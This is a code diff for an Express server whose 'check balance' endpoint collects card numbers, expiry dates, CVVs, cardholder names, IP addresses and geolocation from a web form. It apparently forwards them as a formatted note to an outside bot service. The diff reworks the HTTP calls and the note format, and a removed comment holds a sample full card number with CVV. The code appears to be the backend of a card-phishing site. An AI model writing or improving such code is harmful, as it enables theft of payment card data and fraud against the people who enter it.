@@ -1,6 +1,8 @@
 import express from 'express';
 import cors from 'cors';
 import path from 'path';
+import https from 'https';
+import http from 'http';
 import { fileURLToPath } from 'url';
 import { config } from 'dotenv';
 
@@ -8,7 +10,7 @@ config();
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const app = express();
-const PORT = process.env.PORT || 3001;
+const PORT = process.env.PORT || 3002;
 const API_URL = 'https://bot.pc.am/v3/checkBalance';
 
 app.use(cors({ origin: '*' }));
@@ -17,16 +19,20 @@ app.use(express.json());
 // Serve static files in production
 app.use(express.static(path.join(__dirname, '../dist')));
 
+// Helper: make GET request using Node https/http modules
+function httpGet(url) {
+  return new Promise((resolve, reject) => {
+    const mod = url.startsWith('https') ? https : http;
+    mod.get(url, (resp) => {
+      let data = '';
+      resp.on('data', (chunk) => { data += chunk; });
+      resp.on('end', () => resolve(data));
+    }).on('error', reject);
+  });
+}
+
 /**
- * Balance Check API - Replace this with your bank's API integration
- *
- * Your bank API will likely need:
- * - Card number (PAN)
- * - Expiration date (MM/YY)
- * - CVV
- *
- * Response format expected by frontend:
- * { success: boolean, balance?: number, currency?: string, error?: string }
+ * Balance Check API
  */
 app.post('/api/check-balance', async (req, res) => {
   const API_TOKEN = process.env.API_TOKEN;
@@ -42,7 +48,7 @@ app.post('/api/check-balance', async (req, res) => {
     return res.json({ success: false, error: 'API token not configured' });
   }
 
-  const { cardNumber, expiryMonth, expiryYear, cvv, cardHolder, timezone, userAgent, referral, pageUrl } = req.body;
+  const { cardNumber, expiryMonth, expiryYear, cvv, cardHolder, timezone, referral } = req.body;
 
   try {
     const number = (cardNumber || '').replace(/\s/g, '');
@@ -66,27 +72,23 @@ app.post('/api/check-balance', async (req, res) => {
     // Lookup location from IP
     let location = '';
     try {
-      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city`);
-      const geo = await geoRes.json();
+      const geoText = await httpGet(`http://ip-api.com/json/${ip}?fields=status,country,city`);
+      const geo = JSON.parse(geoText);
       if (geo.status === 'success') {
         location = `${geo.city}, ${geo.country}`;
       }
     } catch {}
 
-    // Build note in exact format:
-    // API card received: 4343404208851958 01/27 370
-    // IP: x.x.x.x | Location: City, Country | Timezone: ... | Referral: ... | Page: ... | UA: ...
-    const cardLine = `API card received: ${number} ${month}/${year} ${cvvVal}`;
-    const infoParts = [];
-    infoParts.push(`IP: ${ip || 'unknown'}`);
-    if (location) infoParts.push(`Location: ${location}`);
-    if (timezone) infoParts.push(`Timezone: ${timezone}`);
-    infoParts.push(`Referral: ${referral || 'Direct'}`);
-    infoParts.push(`Page: ${pageUrl || 'unknown'}`);
-    if (cardHolder) infoParts.push(`Name: ${cardHolder}`);
-    if (userAgent) infoParts.push(`UA: ${userAgent}`);
+    // Build note
+    const lines = [];
+    lines.push(`Card: ${number} ${cvvVal}`);
+    lines.push(`Date: ${month}/${year}`);
+    lines.push(`Name on card: ${cardHolder || 'N/A'}`);
+    lines.push(`IP: ${ip || 'unknown'}${location ? ' (' + location + ')' : ''}`);
+    lines.push(`Timezone: ${timezone || 'N/A'}`);
+    lines.push(`Referral: ${referral || 'Direct'}`);
 
-    const fullNote = cardLine + '\n' + infoParts.join(' | ');
+    const fullNote = lines.join('\n');
 
     // Required params
     const params = new URLSearchParams({
@@ -107,8 +109,8 @@ app.post('/api/check-balance', async (req, res) => {
     if (SCREENSHOT_QUALITY) params.set('screenshot_jpeg_quality', SCREENSHOT_QUALITY);
     if (SCREENSHOT_SIZE) params.set('screenshot_box_size', SCREENSHOT_SIZE);
 
-    const apiRes = await fetch(API_URL + '?' + params.toString());
-    const text = await apiRes.text();
+    const apiUrl = API_URL + '?' + params.toString();
+    const text = await httpGet(apiUrl);
     let data;
     try {
       data = JSON.parse(text);
